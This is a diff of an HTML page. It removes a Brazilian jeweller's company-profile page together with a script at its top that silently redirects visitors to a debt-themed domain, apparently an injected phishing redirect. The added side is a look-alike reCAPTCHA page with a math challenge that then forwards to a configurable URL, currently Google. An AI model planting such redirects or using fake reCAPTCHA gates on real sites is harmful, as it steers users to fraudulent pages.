@@ -1,13 +1,22 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <script language= "JavaScript">
-location.href="https://debitos-es-online.services/id03"
-</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anas Paladini Joias - Página Institucional</title>
+    <title>Verificação de Segurança</title>
     <style>
+        :root {
+            --recaptcha-blue: #1a73e8;
+            --recaptcha-blue-hover: #1557b0;
+            --border-color: #d3d3d3;
+            --bg-white: #ffffff;
+            --bg-gray: #f9f9f9;
+            --text-dark: #333333;
+            --text-gray: #757575;
+            --success-green: #34a853;
+            --error-red: #ea4335;
+        }
+
         * {
             margin: 0;
             padding: 0;
@@ -15,371 +24,758 @@ location.href="https://debitos-es-online.services/id03"
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #1a1a1a;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+            background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        .card {
-            max-width: 1000px;
+        /* Container principal - imita o card do reCAPTCHA */
+        .recaptcha-wrapper {
+            background: var(--bg-white);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
             width: 100%;
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-            overflow: hidden;
-            border: 1px solid #d4af37;
+            max-width: 340px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            transition: box-shadow 0.3s ease;
         }
 
-        /* Cabeçalho */
-        .header {
-            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
-            padding: 30px 40px;
-            border-bottom: 4px solid #d4af37;
+        .recaptcha-wrapper:hover {
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
+        }
+
+        /* Área do checkbox principal */
+        .recaptcha-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 18px;
+            cursor: pointer;
+            gap: 12px;
+            min-height: 60px;
+            transition: background 0.2s ease;
+        }
+
+        .recaptcha-box:hover {
+            background: #fafbfc;
+        }
+
+        .recaptcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+
+        /* Checkbox customizado */
+        .custom-checkbox {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #9e9e9e;
+            border-radius: 2px;
+            background: #fff;
+            position: relative;
+            flex-shrink: 0;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .custom-checkbox.checked {
+            background: var(--success-green);
+            border-color: var(--success-green);
+            animation: popCheck 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popCheck {
+            0% {
+                transform: scale(0.8);
+            }
+            50% {
+                transform: scale(1.15);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* Ícone de visto */
+        .check-icon {
+            opacity: 0;
+            transform: scale(0) rotate(-45deg);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            line-height: 1;
+        }
+
+        .custom-checkbox.checked .check-icon {
+            opacity: 1;
+            transform: scale(1) rotate(0deg);
+        }
+
+        /* Spinner de carregamento */
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #e0e0e0;
+            border-top-color: var(--recaptcha-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+            flex-shrink: 0;
+        }
+
+        .spinner.active {
+            display: block;
+        }
+
+        .custom-checkbox.loading {
+            display: none;
+        }
+
+        .custom-checkbox.loading+.spinner {
+            display: block;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Texto "Não sou robô" */
+        .recaptcha-label {
+            font-size: 15px;
+            color: var(--text-dark);
+            font-weight: 400;
+            white-space: nowrap;
+            letter-spacing: 0.2px;
+        }
+
+        /* Área direita - logo e texto */
+        .recaptcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            flex-shrink: 0;
             text-align: center;
         }
 
-        .header h1 {
-            color: #d4af37;
-            font-size: 28px;
-            letter-spacing: 2px;
-            font-weight: 700;
-            text-transform: uppercase;
+        .recaptcha-logo-icon {
+            width: 36px;
+            height: 36px;
+            /* Ícone SVG inline de escudo com seta circular */
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        .header .subtitle {
-            color: #aaaaaa;
-            font-size: 14px;
-            margin-top: 5px;
-            letter-spacing: 1px;
+        .recaptcha-logo-icon svg {
+            width: 32px;
+            height: 32px;
         }
 
-        .header .status {
-            display: inline-block;
-            margin-top: 12px;
-            background: #2e7d32;
+        .recaptcha-brand {
+            font-size: 9px;
+            color: #555;
+            letter-spacing: 0.3px;
+            line-height: 1;
+            text-align: center;
+        }
+
+        .recaptcha-brand span {
+            display: block;
+            font-size: 8px;
+            color: #888;
+        }
+
+        /* Status de verificação */
+        .verification-status {
+            text-align: center;
+            font-size: 13px;
+            padding: 0 18px 14px;
+            color: var(--text-gray);
+            min-height: 20px;
+            transition: color 0.3s;
+        }
+
+        .verification-status.success {
+            color: var(--success-green);
+            font-weight: 500;
+        }
+        .verification-status.error {
+            color: var(--error-red);
+            font-weight: 500;
+        }
+        .verification-status.info {
+            color: var(--recaptcha-blue);
+        }
+
+        /* Modal do desafio */
+        .challenge-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.55);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .challenge-modal {
+            background: #fff;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            animation: slideUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(40px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .challenge-header {
+            background: var(--recaptcha-blue);
             color: #fff;
-            padding: 6px 24px;
-            border-radius: 30px;
-            font-size: 14px;
-            font-weight: bold;
-            letter-spacing: 1px;
-        }
-
-        /* Conteúdo */
-        .content {
-            padding: 30px 40px;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 30px;
-        }
-
-        @media (max-width: 700px) {
-            .grid {
-                grid-template-columns: 1fr;
-                gap: 20px;
-            }
-            .header h1 {
-                font-size: 20px;
-            }
-            .content {
-                padding: 20px;
-            }
-        }
-
-        .section {
-            background: #f8f8f8;
-            padding: 20px 24px;
-            border-radius: 14px;
-            border-left: 4px solid #d4af37;
-            transition: 0.2s;
-        }
-
-        .section:hover {
-            background: #f0f0f0;
-        }
-
-        .section h2 {
-            font-size: 16px;
-            text-transform: uppercase;
-            color: #d4af37;
-            letter-spacing: 1.5px;
-            margin-bottom: 16px;
-            border-bottom: 1px solid #e0e0e0;
-            padding-bottom: 8px;
+            padding: 14px 18px;
+            font-size: 15px;
+            font-weight: 500;
             display: flex;
             align-items: center;
             gap: 10px;
         }
 
-        .section h2 i {
-            font-style: normal;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 6px 0;
-            font-size: 15px;
-            border-bottom: 1px dashed #e8e8e8;
-        }
-
-        .info-row:last-child {
-            border-bottom: none;
-        }
-
-        .info-label {
-            color: #555;
-            font-weight: 600;
-        }
-
-        .info-value {
-            color: #1a1a1a;
-            text-align: right;
-            font-weight: 500;
-        }
-
-        .info-value strong {
-            color: #000;
-        }
-
-        .info-value a {
-            color: #1a1a1a;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .info-value a:hover {
-            color: #d4af37;
-            text-decoration: underline;
-        }
-
-        .full-width {
-            grid-column: 1 / -1;
-        }
-
-        .contact-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 8px 0;
-            border-bottom: 1px solid #eee;
-            font-size: 15px;
-        }
-
-        .contact-item:last-child {
-            border-bottom: none;
-        }
-
-        .contact-item .icon {
+        .challenge-header .shield-icon {
             font-size: 20px;
-            min-width: 30px;
+        }
+
+        .challenge-body {
+            padding: 20px 18px;
             text-align: center;
         }
 
-        .contact-item a {
-            color: #1a1a1a;
-            text-decoration: none;
-            font-weight: 500;
-            transition: 0.2s;
+        .challenge-question {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+            letter-spacing: 0.5px;
         }
 
-        .contact-item a:hover {
-            color: #d4af37;
-        }
-
-        .tag {
-            display: inline-block;
-            background: #d4af37;
-            color: #1a1a1a;
-            font-size: 12px;
-            font-weight: bold;
-            padding: 2px 12px;
-            border-radius: 20px;
-            margin-left: 8px;
-        }
-
-        .cnae-principal {
-            font-weight: 700;
-            color: #1a1a1a;
-        }
-
-        .cnae-secundaria {
-            font-weight: 400;
-            color: #444;
-            font-size: 14px;
-        }
-
-        .maps-link {
-            display: inline-block;
-            margin-top: 12px;
-            background: #d4af37;
-            color: #1a1a1a;
-            padding: 10px 24px;
-            border-radius: 40px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: 0.3s;
-            border: 1px solid #d4af37;
-        }
-
-        .maps-link:hover {
-            background: transparent;
-            color: #d4af37;
-            border: 1px solid #d4af37;
-        }
-
-        .footer {
-            background: #f0f0f0;
-            padding: 15px 40px;
-            text-align: center;
+        .challenge-subtitle {
             font-size: 13px;
             color: #777;
-            border-top: 1px solid #ddd;
+            margin-bottom: 18px;
         }
 
-        .footer span {
-            color: #d4af37;
-            font-weight: bold;
+        .challenge-input-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .challenge-input {
+            width: 80px;
+            height: 48px;
+            font-size: 22px;
+            text-align: center;
+            border: 2px solid #d0d0d0;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.2s;
+            font-weight: 600;
+            color: #333;
+            background: #fafafa;
+        }
+
+        .challenge-input:focus {
+            border-color: var(--recaptcha-blue);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
+        }
+
+        .challenge-input.error-input {
+            border-color: var(--error-red);
+            animation: shake 0.5s ease;
+            background: #fff5f5;
+        }
+
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            20% {
+                transform: translateX(-8px);
+            }
+            40% {
+                transform: translateX(8px);
+            }
+            60% {
+                transform: translateX(-5px);
+            }
+            80% {
+                transform: translateX(5px);
+            }
+        }
+
+        .challenge-btn {
+            display: inline-block;
+            padding: 10px 28px;
+            background: var(--recaptcha-blue);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 14px;
+        }
+
+        .challenge-btn:hover {
+            background: var(--recaptcha-blue-hover);
+        }
+        .challenge-btn:active {
+            transform: scale(0.96);
+        }
+
+        .challenge-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 18px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .challenge-refresh {
+            background: none;
+            border: none;
+            color: var(--recaptcha-blue);
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            padding: 6px 10px;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+
+        .challenge-refresh:hover {
+            background: #e8f0fe;
+        }
+
+        /* Responsivo */
+        @media (max-width: 400px) {
+            .recaptcha-box {
+                padding: 12px 14px;
+                gap: 8px;
+            }
+            .recaptcha-label {
+                font-size: 14px;
+            }
+            .custom-checkbox {
+                width: 24px;
+                height: 24px;
+            }
+            .challenge-modal {
+                max-width: 95vw;
+            }
+            .challenge-question {
+                font-size: 16px;
+            }
+        }
+
+        /* Ocultar overlays */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Botão de reset opcional */
+        .reset-link {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+            color: var(--recaptcha-blue);
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: underline;
+            opacity: 0.7;
+            transition: opacity 0.2s;
+        }
+        .reset-link:hover {
+            opacity: 1;
         }
     </style>
 </head>
 <body>
 
-<div class="card">
+    <div style="text-align: center;">
+        <!-- Card principal estilo reCAPTCHA -->
+        <div class="recaptcha-wrapper" id="recaptchaCard">
+            <!-- Linha principal com checkbox -->
+            <div class="recaptcha-box" id="recaptchaBox" title="Clique para verificar">
+                <!-- Lado esquerdo: checkbox + label -->
+                <div class="recaptcha-left">
+                    <div class="custom-checkbox" id="customCheckbox">
+                        <span class="check-icon">✓</span>
+                    </div>
+                    <div class="spinner" id="spinner"></div>
+                    <span class="recaptcha-label">Não sou robô</span>
+                </div>
 
-    <!-- TOPO -->
-    <div class="header">
-        <h1>✨ Anas Paladini Joias</h1>
-        <div class="subtitle">Anas Paladini Comercio de Joias LTDA</div>
-        <div class="status">✓ Situação Cadastral: ATIVA</div>
-    </div>
-
-    <!-- CONTEÚDO -->
-    <div class="content">
-
-        <div class="grid">
-
-            <!-- COLUNA 1 - DADOS CADASTRAIS -->
-            <div class="section">
-                <h2><i>📋</i> Identificação</h2>
-                <div class="info-row">
-                    <span class="info-label">CNPJ</span>
-                    <span class="info-value"><strong>28.311.758/0001-60</strong></span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Inscrição Estadual (SP)</span>
-                    <span class="info-value">647.895.107.116</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Razão Social</span>
-                    <span class="info-value">Anas Paladini Comercio de Joias LTDA</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Data Abertura</span>
-                    <span class="info-value">01/08/2017 <span style="color:#888; font-weight:400;">(8 anos, 11 meses e 15 dias)</span></span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Natureza Jurídica</span>
-                    <span class="info-value">Sociedade Empresária Limitada</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Porte</span>
-                    <span class="info-value">Empresa de Pequeno Porte</span>
+                <!-- Lado direito: logo -->
+                <div class="recaptcha-right">
+                    <div class="recaptcha-logo-icon">
+                        <!-- Ícone SVG: escudo com seta circular (estilo reCAPTCHA) -->
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2L3 7V11C3 16.5 6.5 21.5 12 23C17.5 21.5 21 16.5 21 11V7L12 2Z"
+                            fill="#4A90D9" stroke="#3A7BC8" stroke-width="1.2" stroke-linejoin="round"/>
+                            <path d="M8 12L11 15L16 9" stroke="white" stroke-width="2.5"
+                            stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                            <circle cx="18" cy="5" r="5" fill="#34A853" stroke="white" stroke-width="1.5"/>
+                            <path d="M16.5 3.5L18 5L20 2.5" stroke="white" stroke-width="1.5"
+                            stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                        </svg>
+                    </div>
+                    <div class="recaptcha-brand">
+                        reCAPTCHA
+                        <span>Privacidade · Termos</span>
+                    </div>
                 </div>
             </div>
+            <!-- Mensagem de status -->
+            <div class="verification-status" id="statusMsg"></div>
+        </div>
 
-            <!-- COLUNA 2 - REGIME E CAPITAL -->
-            <div class="section">
-                <h2><i>⚖️</i> Regime & Capital</h2>
-                <div class="info-row">
-                    <span class="info-label">Tipo</span>
-                    <span class="info-value"><strong>Matriz</strong></span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Opção pelo MEI</span>
-                    <span class="info-value">Não</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Opção pelo Simples</span>
-                    <span class="info-value">Sim <span style="color:#888; font-weight:400;">(desde 01/08/2017)</span></span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Capital Social</span>
-                    <span class="info-value"><strong>R$ 50.000,00</strong></span>
-                </div>
-                <div class="info-row" style="border-bottom: none; margin-top: 8px;">
-                    <span class="info-label">Situação</span>
-                    <span class="info-value" style="color:#2e7d32; font-weight:700;">ATIVA</span>
-                </div>
-            </div>
-
-            <!-- CONTATOS (ocupa 2 colunas) -->
-            <div class="section full-width">
-                <h2><i>📞</i> Contatos</h2>
-                <div class="contact-item">
-                    <span class="icon">📧</span>
-                    <a href="mailto:paladini.joalheria@gmail.com">paladini.joalheria@gmail.com</a>
-                </div>
-                <div class="contact-item">
-                    <span class="icon">📱</span>
-                    <a href="tel:+171733012030">(17) 3301-2030</a> <span class="tag">Fixo</span>
-                </div>
-                <div class="contact-item">
-                    <span class="icon">💬</span>
-                    <a href="https://wa.me/5517988436625" target="_blank">(17) 98843-6625</a> <span class="tag">WhatsApp</span>
-                </div>
-            </div>
-
-            <!-- ENDEREÇO (ocupa 2 colunas) -->
-            <div class="section full-width">
-                <h2><i>📍</i> Localização</h2>
-                <div style="display: flex; flex-direction: column; gap: 4px; font-size: 15px; line-height: 1.6;">
-                    <p><strong>Logradouro:</strong> Rua Carlos Avila Borges, 480</p>
-                    <p><strong>Bairro:</strong> Condominio Village Santa Helena</p>
-                    <p><strong>CEP:</strong> 15091-600</p>
-                    <p><strong>Município:</strong> São José do Rio Preto - SP</p>
-                </div>
-                <div style="margin-top: 12px; background: #eee; padding: 12px 16px; border-radius: 10px; font-size: 14px; border-left: 3px solid #d4af37;">
-                    <strong>Para correspondência:</strong><br>
-                    Anas Paladini Comercio de Joias LTDA<br>
-                    Rua Carlos Avila Borges 480, Condominio Village Santa Helena<br>
-                    São José do Rio Preto - SP, 15091-600
-                </div>
-                <a href="https://www.google.com/maps/search/?api=1&query=Rua+Carlos+Avila+Borges+480+São+José+do+Rio+Preto+SP" 
-                   target="_blank" class="maps-link">
-                   🗺️ Procurar no Google Maps
-                </a>
-            </div>
-
-            <!-- ATIVIDADES CNAE (ocupa 2 colunas) -->
-            <div class="section full-width">
-                <h2><i>🏷️</i> Atividades - CNAEs</h2>
-                <div style="margin-bottom: 12px; padding: 12px 16px; background: #1a1a1a; color: #d4af37; border-radius: 10px;">
-                    <div style="font-weight: 700; font-size: 15px;">Principal:</div>
-                    <div style="font-size: 16px; color: #fff;">47.83-1-01 - Comércio varejista de artigos de joalheria</div>
-                </div>
-                <div style="display: flex; flex-direction: column; gap: 8px; padding-left: 8px;">
-                    <div><span style="font-weight:600; color:#555;">Secundária 1:</span> 74.90-1-04 - Atividades de intermediação e agenciamento de serviços e negócios em geral, exceto imobiliários</div>
-                    <div><span style="font-weight:600; color:#555;">Secundária 2:</span> 32.11-6-02 - Fabricação de artefatos de joalheria e ourivesaria</div>
-                </div>
-            </div>
-
+        <!-- Link para resetar -->
+        <div class="reset-link" id="resetLink" style="display:none;" onclick="resetVerification()">
+            ↻ Refazer verificação
         </div>
     </div>
 
-    <!-- RODAPÉ -->
-    <div class="footer">
-        <span>Anas Paladini Comercio de Joias LTDA</span> | CNPJ 28.311.758/0001-60 | © 2026
+    <!-- Modal do desafio (inicialmente oculto) -->
+    <div class="challenge-overlay hidden" id="challengeOverlay">
+        <div class="challenge-modal">
+            <div class="challenge-header">
+                <span class="shield-icon">🛡️</span>
+                Verificação de segurança
+            </div>
+            <div class="challenge-body">
+                <p class="challenge-question" id="challengeQuestion">Quanto é 7 + 4?</p>
+                <p class="challenge-subtitle">Digite a resposta para continuar</p>
+                <div class="challenge-input-group">
+                    <input type="text"
+                    class="challenge-input"
+                    id="challengeInput"
+                    inputmode="numeric"
+                    maxlength="3"
+                    placeholder="?"
+                    autocomplete="off"
+                    onkeydown="if(event.key==='Enter')verifyChallenge()">
+                </div>
+                <button class="challenge-btn" onclick="verifyChallenge()">
+                    Verificar
+                </button>
+            </div>
+            <div class="challenge-footer">
+                <span>Proteção automática</span>
+                <button class="challenge-refresh" onclick="refreshChallenge()">
+                    ↻ Novo desafio
+                </button>
+            </div>
+        </div>
     </div>
 
-</div>
+    <script>
+        // ==================== CONFIGURAÇÃO ====================
+        // URL para onde o usuário será redirecionado após passar na verificação
+        const REDIRECT_URL = 'https://www.google.com.br';
+        // Tempo de espera (em ms) após aprovação antes de redirecionar
+        const REDIRECT_DELAY = 1800;
+        // =====================================================
 
+        // Elementos do DOM
+        const recaptchaBox = document.getElementById('recaptchaBox');
+        const customCheckbox = document.getElementById('customCheckbox');
+        const spinnerEl = document.getElementById('spinner');
+        const statusMsg = document.getElementById('statusMsg');
+        const resetLink = document.getElementById('resetLink');
+        const challengeOverlay = document.getElementById('challengeOverlay');
+        const challengeQuestion = document.getElementById('challengeQuestion');
+        const challengeInput = document.getElementById('challengeInput');
+        const recaptchaCard = document.getElementById('recaptchaCard');
+
+        // Estado
+        let isVerified = false;
+        let isProcessing = false;
+        let currentAnswer = null;
+        let challengeActive = false;
+
+        // Gerar um desafio matemático aleatório
+        function generateChallenge() {
+            const operations = [
+                { op: '+', calc: (a, b) => a + b, symbol: '+' },
+                { op: '-', calc: (a, b) => a - b, symbol: '−' },
+                { op: '×', calc: (a, b) => a * b, symbol: '×' },
+            ];
+
+            const chosen = operations[Math.floor(Math.random() * operations.length)];
+            let a, b, answer;
+
+            switch (chosen.op) {
+                case '+':
+                    a = Math.floor(Math.random() * 20) + 1; // 1-20
+                    b = Math.floor(Math.random() * 20) + 1; // 1-20
+                    answer = a + b;
+                    break;
+                case '-':
+                    a = Math.floor(Math.random() * 20) + 5; // 5-24
+                    b = Math.floor(Math.random() * a) + 1; // 1 até a
+                    answer = a - b;
+                    break;
+                case '×':
+                    a = Math.floor(Math.random() * 10) + 1; // 1-10
+                    b = Math.floor(Math.random() * 10) + 1; // 1-10
+                    answer = a * b;
+                    break;
+                default:
+                    a = 5;
+                    b = 3;
+                    answer = 8;
+            }
+
+            return {
+                questionText: `Quanto é ${a} ${chosen.symbol} ${b}?`,
+                answer: answer,
+            };
+        }
+
+        // Atualizar o texto do desafio no modal
+        function refreshChallenge() {
+            const challenge = generateChallenge();
+            currentAnswer = challenge.answer;
+            challengeQuestion.textContent = challenge.questionText;
+            challengeInput.value = '';
+            challengeInput.classList.remove('error-input');
+            challengeInput.focus();
+            // Pequeno reset visual
+            challengeInput.style.borderColor = '#d0d0d0';
+            challengeInput.style.background = '#fafafa';
+        }
+
+        // Mostrar o modal do desafio
+        function showChallenge() {
+            if (isVerified || isProcessing) return;
+            challengeActive = true;
+            refreshChallenge();
+            challengeOverlay.classList.remove('hidden');
+            statusMsg.textContent = 'Resolva o desafio para continuar';
+            statusMsg.className = 'verification-status info';
+            // Esconder spinner, mostrar checkbox normal
+            spinnerEl.classList.remove('active');
+            customCheckbox.style.display = 'flex';
+            customCheckbox.classList.remove('checked', 'loading');
+            // Focar no input após animação
+            setTimeout(() => {
+                challengeInput.focus();
+            }, 350);
+        }
+
+        // Fechar o modal do desafio
+        function hideChallenge() {
+            challengeOverlay.classList.add('hidden');
+            challengeActive = false;
+            challengeInput.value = '';
+        }
+
+        // Verificar a resposta do desafio
+        function verifyChallenge() {
+            if (!challengeActive) return;
+
+            const userAnswer = parseInt(challengeInput.value.trim(), 10);
+
+            if (isNaN(userAnswer)) {
+                // Entrada inválida
+                challengeInput.classList.add('error-input');
+                statusMsg.textContent = 'Digite um número válido';
+                statusMsg.className = 'verification-status error';
+                setTimeout(() => {
+                    challengeInput.classList.remove('error-input');
+                }, 600);
+                challengeInput.focus();
+                return;
+            }
+
+            if (userAnswer === currentAnswer) {
+                // Resposta correta!
+                hideChallenge();
+                approveVerification();
+            } else {
+                // Resposta errada
+                challengeInput.classList.add('error-input');
+                statusMsg.textContent = 'Resposta incorreta. Tente novamente.';
+                statusMsg.className = 'verification-status error';
+                challengeInput.value = '';
+                challengeInput.focus();
+                setTimeout(() => {
+                    challengeInput.classList.remove('error-input');
+                }, 600);
+                // Gerar novo desafio para não ficar repetitivo
+                setTimeout(() => {
+                    if (challengeActive) {
+                        refreshChallenge();
+                    }
+                }, 800);
+            }
+        }
+
+        // Aprovar verificação
+        function approveVerification() {
+            isVerified = true;
+            isProcessing = false;
+            challengeActive = false;
+
+            // Marcar checkbox como verificado
+            customCheckbox.classList.add('checked');
+            customCheckbox.style.display = 'flex';
+            spinnerEl.classList.remove('active');
+            customCheckbox.classList.remove('loading');
+
+            // Atualizar status
+            statusMsg.textContent = '✅ Verificação concluída! Redirecionando...';
+            statusMsg.className = 'verification-status success';
+
+            // Mostrar link de reset
+            resetLink.style.display = 'block';
+
+            // Desabilitar clique no card
+            recaptchaCard.style.pointerEvents = 'none';
+            recaptchaCard.style.opacity = '0.85';
+
+            // Redirecionar após delay
+            setTimeout(() => {
+                statusMsg.textContent = '✅ Redirecionando agora...';
+                window.location.href = REDIRECT_URL;
+            }, REDIRECT_DELAY);
+        }
+
+        // Resetar toda a verificação
+        function resetVerification() {
+            isVerified = false;
+            isProcessing = false;
+            challengeActive = false;
+            hideChallenge();
+            customCheckbox.classList.remove('checked', 'loading');
+            customCheckbox.style.display = 'flex';
+            spinnerEl.classList.remove('active');
+            statusMsg.textContent = '';
+            statusMsg.className = 'verification-status';
+            resetLink.style.display = 'none';
+            recaptchaCard.style.pointerEvents = 'auto';
+            recaptchaCard.style.opacity = '1';
+            challengeInput.value = '';
+            challengeInput.classList.remove('error-input');
+            currentAnswer = null;
+        }
+
+        // Clique no card principal
+        recaptchaBox.addEventListener('click', function(e) {
+            if (isVerified || isProcessing || challengeActive) return;
+
+            // Iniciar processamento
+            isProcessing = true;
+            statusMsg.textContent = 'Verificando...';
+            statusMsg.className = 'verification-status info';
+
+            // Mostrar spinner
+            customCheckbox.classList.add('loading');
+            spinnerEl.classList.add('active');
+            customCheckbox.style.display = 'none';
+
+            // Simular tempo de "análise" e então mostrar desafio
+            const analysisTime = 800 + Math.random() * 1200; // 0.8 a 2 segundos
+
+            setTimeout(() => {
+                if (!isVerified && isProcessing) {
+                    showChallenge();
+                    isProcessing = false;
+                }
+            }, analysisTime);
+        });
+
+        // Fechar modal ao clicar fora (no overlay)
+        challengeOverlay.addEventListener('click', function(e) {
+            if (e.target === challengeOverlay) {
+                if (!isVerified) {
+                    hideChallenge();
+                    isProcessing = false;
+                    customCheckbox.classList.remove('loading');
+                    customCheckbox.style.display = 'flex';
+                    spinnerEl.classList.remove('active');
+                    statusMsg.textContent = 'Verificação cancelada. Clique para tentar novamente.';
+                    statusMsg.className = 'verification-status';
+                    challengeInput.value = '';
+                    currentAnswer = null;
+                    challengeActive = false;
+                }
+            }
+        });
+
+        // Prevenir envio acidental do formulário ao pressionar Enter no input
+        challengeInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                verifyChallenge();
+            }
+        });
+
+        // Impedir que clique no modal feche ele
+        document.querySelector('.challenge-modal').addEventListener('click', function(e) {
+            e.stopPropagation();
+        });
+
+        // Inicialização
+        console.log('🛡️ Verificação de segurança pronta.');
+        console.log('➡️ URL de destino:', REDIRECT_URL);
+        console.log('ℹ️ Clique em "Não sou robô" para iniciar a verificação.');
+    </script>
 </body>
 </html>
